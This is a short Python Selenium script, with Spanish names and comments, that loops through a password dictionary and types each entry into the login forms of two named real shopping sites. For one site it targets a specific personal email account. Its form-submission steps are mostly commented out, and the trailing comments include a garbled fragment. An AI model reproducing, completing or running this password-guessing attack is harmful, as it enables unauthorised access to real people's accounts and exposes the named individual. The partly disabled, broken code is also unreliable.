#!/usr/bin/env python
# -*- coding: utf-8 -*-
from selenium import webdriver
import threading
from selenium.webdriver.common.keys import Keys
import time
import os
contador=1
pagina=int(input("1 libreria moderna    2 ultra pc     ingrese opcion "))
diccionario=open(str(os.getcwdb()).split("'")[1]+'/diccionario.txt','r')
listaclaves=[]
for linea in diccionario:
    listaclaves.append(linea)
candado=threading.Lock()
def funcion(listaclaves,pagina,i,contador):
    candado.acquire()
    browser = webdriver.Chrome("/usr/bin/chromedriver")
    clave=str(listaclaves[i])
    print("intento "+str(contador)+":"+" "+str(clave))
    if pagina==1:
        #time.sleep(5)
        browser.get("https://www.libreriamoderna.es/es/registro/autenticacion.php")
        username = browser.find_element_by_id("usuario")
        username.send_keys("jabiera.voladora@gmail.com")
        password = browser.find_elements_by_xpath("(//input[@id='clave'])")[1].send_keys(clave)
        #password = browser.find_element_by_id("clave").send_keys(clave)
        #time.sleep(5)
    elif pagina==2:
        browser.get("https://www.ultrapc.cl/my-account/")
        #time.sleep(5)
        username = browser.find_element_by_id("username")
        username.send_keys("usuario")
        password = browser.find_element_by_id("password").send_keys(clave)
        #boton=browser.find_elements_by_xpath("(//input[@type='submit'])")[1].click()
        #time.sleep(10)
        #browser.find_element_by_css_selector(".woocommerce-button button woocommerce-form-login__submit[value='Acceder']").click()
        #login=browser.find_element_by_name("login")
        #time.sleep(10)
        #login.click()
    time.sleep(3)
    browser.close()
    candado.release()
for numero in range(100):
    thread=threading.Thread(target=funcion,args=(listaclaves,pagina,numero,contador))
    thread.start()
    thread.join()
    contador+=1
       #time.sleep(5)
    #time.sleep(10)
    #password.send_keys(clave)
    #browser.find_element_by_name("login").click()
#time.sleep(5)

#
#time.sleep(10)
#
#for i in range(100):
#    print("p
    #login_attempt = browser.find_elepi")ement_by_xpath("//*[@type='submit']")
    #login_attempt.submit()
#    time.sleep(30)
#    contador+=1
